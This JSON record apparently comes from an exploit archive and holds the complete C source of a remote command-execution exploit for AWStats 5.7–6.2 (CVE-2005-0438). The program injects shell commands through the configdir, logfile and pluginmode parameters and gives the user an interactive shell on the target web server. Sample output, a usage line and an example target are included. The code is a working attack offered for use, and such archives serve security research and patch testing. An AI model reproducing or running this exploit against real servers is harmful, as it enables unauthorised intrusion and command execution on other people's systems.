{
  "id": "853",
  "title": "AWStats 5.7 &lt; 6.2 - Multiple Remote s",
  "cve": "CVE-2005-0438",
  "vuln_type": "unknown",
  "code": "/*\r\n * Awstats exploit \"shell\" \r\n * code by omin0us\r\n * omin0us208 [at] gmail [dot] com\r\n * dtors security group\r\n * .:( http://dtors.ath.cx ):.\r\n *\r\n * Vulnerability reported by iDEFENSE\r\n * pluginmode bug has been found by GHC team.\r\n *\r\n * The awstats exploit that was discovered allows\r\n * a user to execute arbitrary commands on the \r\n * remote server with the privileges of the httpd \r\n *\r\n * This exploit combines all three methods of exploitation\r\n * and acts as a remote \"shell\", parsing all returned \r\n * data to display command output and running in a loop\r\n * for continuous access.\r\n * \r\n * bash-2.05b$ awstats_shell localhost                                     \r\n * Awstats 5.7 - 6.2 exploit Shell 0.1\r\n * code by omin0us\r\n * dtors security group\r\n * .: http://dtors.ath.cx :.\r\n * --------------------------------------\r\n * select exploit method:\r\n *        1. ?configdir=|cmd}\r\n *        2. ?update=1&logfile=|cmd|\r\n *        3. ?pluginmode=:system(\"cmd\");\r\n *\r\n * method [1/2/3]? 1\r\n * starting shell...\r\n * (ctrl+c to exit)\r\n * sh3ll> id\r\n * uid=80(www) gid=80(www) groups=80(www)\r\n * DTORS_STOP\r\n * sh3ll> uname -a\r\n *\r\n * FreeBSD omin0us.dtors.ath.cx 4.8-RELEASE FreeBSD 4.8-RELEASE #3: Mon Oct 11 \r\n * 19:34:01 EDT 2004     omin0us@localhost:/usr/src/sys/compile/DTORS  i386\r\n * DTORS_STOP\r\n * sh3ll>\r\n *\r\n * this is licensed under the GPL\r\n */\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define PORT 80\r\n#define CMD_BUFFER 512\r\n#define IN_BUFFER 10000\r\n#define MAGIC_START \"DTORS_START\"\r\n#define MAGIC_STOP  \"DTORS_STOP\"\r\n\r\nvoid usage(char *argv[]);\r\n\r\nint main(int argc, char *argv[]){\r\n\r\n\tFILE *output;\r\n\tint sockfd;\r\n\tstruct sockaddr_in addr;\r\n\tstruct hostent *host;\r\n\tchar *host_name=NULL, *awstats_dir=NULL;\r\n\tchar cmd[CMD_BUFFER], cmd_url[CMD_BUFFER*3], incoming[IN_BUFFER], tmp, c, cli_opt;\r\n\tint i, j, flag, method, verbose=0;\r\n\r\n\t\r\n\tif(argc < 2){\r\n\t\tusage(argv);\r\n\t}\r\n\t\r\n\tprintf(\"Awstats 5.7 - 6.2 exploit Shell 0.1\\n\");\t\r\n\tprintf(\"code by omin0us\\n\");\r\n\tprintf(\"dtors security group\\n\");\r\n\tprintf(\".: http://dtors.ath.cx :.\\n\");\r\n    printf(\"--------------------------------------\\n\");\r\n\r\n\twhile(1){\r\n\t\tcli_opt = getopt(argc, argv, \"h:d:v\");\r\n\r\n\t\tif(cli_opt < 0)\r\n\t\t\tbreak;\r\n\r\n\t\tswitch(cli_opt){\r\n\t\t\tcase 'v':\r\n\t\t\t\tverbose = 1;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'd':\r\n\t\t\t\tawstats_dir = optarg;\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\tif((optind >= argc) || (strcmp(argv[optind], \"-\") == 0)){\r\n\t\tprintf(\"Please specify a Host\\n\");\r\n\t\tusage(argv);\r\n\t}\r\n\r\n\tif(!awstats_dir){\r\n\t\tawstats_dir = \"/cgi-bin/awstats.pl\";\r\n\t}\r\n\t\r\n\tprintf(\"select exploit method:\\n\"\r\n\t       \"\\t1. ?configdir=|cmd}\\n\"\r\n\t       \"\\t2. ?update=1&logfile=|cmd|\\n\"\r\n\t       \"\\t3. ?pluginmode=:system(\\\"cmd\\\");\\n\");\r\n\twhile(method != '1' && method != '2' && method != '3'){\r\n\t\tprintf(\"\\nmethod [1/2/3]? \");\r\n\t\tmethod = getchar();\r\n\t}\r\n\r\n\tprintf(\"starting shell...\\n(ctrl+c to exit)\\n\");\r\n\t\t\r\n\t\r\nwhile(1){\r\n\ti=0;\r\n\tj=0;\r\n\tmemset(cmd, 0, CMD_BUFFER);\r\n\tmemset(cmd_url, 0, CMD_BUFFER*3);\r\n\tmemset(incoming, 0, IN_BUFFER);\r\n\t\r\n\tif((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){\r\n\t\tprintf(\"Error creating socket\\n\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\tif((host = gethostbyname(argv[optind])) == NULL){\r\n\t\tprintf(\"Could not resolv host\\n\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\taddr.sin_family = AF_INET;\r\n\taddr.sin_port = htons(PORT);\r\n\taddr.sin_addr = *((struct in_addr *)host->h_addr);\r\n\r\n\tprintf(\"sh3ll> \");\r\n\tfgets(cmd, CMD_BUFFER-1, stdin);\r\n\t\r\n\tif(verbose)\t\r\n\t\tprintf(\"Connecting to %s (%s)...\\n\", host->h_name, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n\tif( connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != 0){\r\n\t\tprintf(\"Count not connect to host\\n\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\toutput = fdopen(sockfd, \"a\");\r\n\tsetbuf(output, NULL);\r\n\r\n\tcmd[strlen(cmd)-1] = '\\0';\r\n\tif(strlen(cmd) == 0){\r\n\t\tcmd[0]='i';\r\n\t\tcmd[1]='d';\r\n\t\tcmd[3]='\\0';\r\n\t}\r\n\r\n\tfor(i=0; i<strlen(cmd); i++){\r\n\t\tc = cmd[i];\r\n\t\tif(c == ' '){\r\n\t\t\tcmd_url[j++] = '%';\r\n\t\t\tcmd_url[j++] = '2';\r\n\t\t\tcmd_url[j++] = '0';\r\n\t\t}\r\n\t\telse{\r\n\t\t\tcmd_url[j++] = c;\r\n\t\t}\r\n\t}\r\n\tcmd_url[j] = '\\0';\r\n\r\n\tif(method == '1'){\r\n\t\tif(verbose){\r\n\t\t\tprintf(\"Sending Request\\n\");\t\r\n\t\t\tprintf(\"GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);\r\n\t\t}\r\n\t\r\n\t\tfprintf(output, \"GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);\r\n\t}\r\n\r\n\tif(method == '2'){\r\n\t\tif(verbose){\r\n\t\t\tprintf(\"Sending Request\\n\");\r\n\t\t\tprintf(\"GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);\r\n\t\t}\r\n\t\tfprintf(output, \"GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);\r\n\t}\r\n\r\n\tif(method == '3'){\r\n\t\tif(verbose){\r\n\t\t\tprintf(\"Sending Request\\n\");\r\n\t\t\tprintf(\"GET %s?pluginmode=:system(\\\"echo+%s;%s;echo+%s\\\"); HTTP/1.0\\n\"\r\n\"Connection: Keep-Alive\\n\"\r\n\"Host: %s\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);\r\n\t\t}\r\n\t\tfprintf(output, \"GET %s?pluginmode=:system(\\\"echo+%s;%s;echo+%s\\\"); HTTP/1.0\\n\"\r\n\"Connection: Keep-Alive\\n\"\r\n\"Host: %s\\n\\n\", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);\r\n\t}\r\n\r\n\r\n\ti=0;\r\n\twhile(strstr(incoming, MAGIC_START) == NULL){\r\n\t\tflag = read(sockfd, &tmp, 1);\r\n\t\tincoming[i++] = tmp;\r\n\r\n\t\tif(i >= IN_BUFFER){\r\n\t\t\tprintf(\"flag [-] incoming buffer full\\n\");\r\n\t\t\texit(1);\r\n\t\t}\r\n\t\tif(flag==0){\r\n\t\t\tprintf(\"exploitation of host failed\\n\");\r\n\t\t\texit(1);\r\n\t\t}\r\n\t}\r\n\t\r\n\twhile(strstr(incoming, MAGIC_STOP) == NULL){\r\n\t\tread(sockfd,&tmp,1);\r\n\t\tincoming[i++] = tmp;\r\n\t\tputchar(tmp);\r\n\t\tif(i >= IN_BUFFER){\r\n\t\t\tprintf(\"putchar [-] incoming buffer full\\n\");\r\n\t\t\texit(1);\r\n\t\t}\r\n\t}\r\n\tprintf(\"\\n\");\r\n\t\r\n\tshutdown(sockfd, SHUT_WR);\r\n\tclose(sockfd);\r\n\tfclose(output);\r\n\t}\r\n\treturn(0);\r\n}\r\n\r\nvoid usage(char *argv[]){\r\n        printf(\"Usage: %s [options] <host>\\n\" , argv[0]);\r\n        printf(\"Options:\\n\");\r\n        printf(\"    -d <awstats_dir>     directory of awstats script\\n\");\r\n        printf(\"                         '/cgi-bin/awstats.pl' is default\\n\");\r\n        printf(\"                         if no directory is specified\\n\\n\");\r\n        printf(\"    -v                   verbose mode (optional)\\n\\n\");\r\n        printf(\"example: %s -d /stats/awstats.pl website.com\\n\\n\", argv[0]);\r\n        exit(1);\r\n}\t\r\n\r\n// milw0rm.com [2005-03-02]",
  "url": "https://www.exploit-db.com/exploits/853"
}